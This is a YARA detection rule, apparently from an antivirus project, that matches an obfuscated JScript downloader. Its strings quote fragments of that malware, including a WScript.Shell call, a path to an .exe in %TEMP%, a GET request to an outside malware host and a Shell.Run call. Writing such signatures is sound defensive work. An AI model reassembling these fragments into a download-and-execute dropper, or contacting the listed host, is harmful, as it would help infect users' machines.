rule sig_20160328_323733198373c15f37260bad8a66f327 {
  meta:
    description = "datamaliciousorder - file 20160328_323733198373c15f37260bad8a66f327.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "46d979c8f3d8e882805805288be68b520656d6a04d6c2718321adef7057ddc43"

  strings:
    $s1  = "function Andyocptv() {return Nxjfkeivv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"K7JwREKbhiUCA.exe\";};" fullword ascii
    $s2  = "Hdpwwrdq[Mxlaz](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Lubwqnjfy](Zoynp() * 11)} while (Hdpwwrdq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Nxjfkeivv = function Ewheoqwt() {return WScript[Jbdvc](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Dfdhe(Ckzku, Cahjngqrb){return Ckzku - Cahjngqrb;};" fullword ascii
    $s6  = "function Rehtr(Smgitf){Nxjfkeivv[\"Run\"](Smgitf, Visuarmith, Visuarmith);};" fullword ascii
    $s7  = "function Tigdxa() {return ((Juxsrg == true) && (Juxsrg == Nifsjuqp)) ? 1 : Visuarmith;};" fullword ascii
    $s8  = "function Jbipdjrgy(){return Jbdvc;};" fullword ascii
    $s9  = "function Qyzvfv(){return Uqborkuo;};" fullword ascii
    $s10 = "function Lbisxdej(Ndawy) {var Ojsfrubrbf = (1, 2, 3, 4, 5, Ndawy); return Ojsfrubrbf;};" fullword ascii
    $s11 = "function Zoynp(){return 22;};" fullword ascii
    $s12 = "function Mpsfddblu()" fullword ascii
    $s13 = "var Yzxydy = new this[\"Date\"]();" fullword ascii
    $s14 = " while (Blhzivmnbo){" fullword ascii
    $s15 = "var Juxsrg = false;" fullword ascii
    $s16 = "var Nifsjuqp = false;" fullword ascii
    $s17 = "Juxsrg = true; " fullword ascii
    $s18 = "var Xbpbfkw = false;" fullword ascii
    $s19 = "return Dfdhe(Vlnusr, Xbtvujwep);" fullword ascii
    $s20 = "Nifsjuqp = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}